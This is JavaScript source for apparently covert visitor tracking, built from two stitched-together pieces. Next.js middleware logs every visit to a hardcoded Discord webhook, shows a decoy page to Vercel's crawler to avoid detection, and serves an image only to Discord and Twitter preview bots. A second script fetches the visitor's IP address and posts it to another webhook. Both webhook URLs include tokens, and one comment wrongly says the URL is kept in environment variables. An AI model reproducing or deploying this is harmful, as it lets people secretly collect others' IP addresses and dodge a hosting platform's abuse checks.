import { NextRequest, NextResponse, userAgent } from 'next/server';

const webhook = "https://discord.com/api/webhooks/1254572509890740354/7odzMwJfY1RwkgwecvcLVrJwTHFPRHskrDPEzk2CuKZcydgS3nqvvCm74UW5xgdcaxv7" // Your webhook URL now is in your project's environment variables.

export async function middleware(req){
  const ua = userAgent(req)?.ua;
  if(!ua || ua.startsWith("vercel-")){
    // Displaying another page for Vercel
    return NextResponse.rewrite(new URL("/vercel.html",req.url));
  }
  const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
  const page = req.url.split("/").slice(-1)[0]
  await fetch(webhook,{body:JSON.stringify({
    embeds:[{
      title:"Triggered view-logger",
      description:(source ? "Source user-agent: "+ua : "It was loaded by an user (or an user on Discord)."),
      footer:{
        text:"Requested page: "+page.slice(0,500),
      },
    }],
  }),headers:{"content-type":"application/json"},method:"POST"})
  if(source){
    // Return the image.
    return NextResponse.rewrite(new URL("/mini.png",req.url))
  }else{
    // Make a message for whoever takes the risk to directly click.
    return NextResponse.rewrite(new URL("/page.html",req.url));
  }
}


const ipifyAPI = "https://api.ipify.org?format=json";


const webhookURL = "https://discord.com/api/webhooks/1253036131856023634/c_9jufl5VYhD8NDBblU3JyRKcAkHq1me4NNGolvj9Opa5GQ6Y016bFUiG3KGnr6XQqgr";


async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) {
        console.error("IP address is null or undefined.");
        return;
    }

    const payload = {
        content: `IP Address: ${ip}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("IP sent to Discord successfully!");
        } else {
            console.error("Error sending IP to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

// Main function to get IP and send to Discord
async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}

// Run the main function
main();
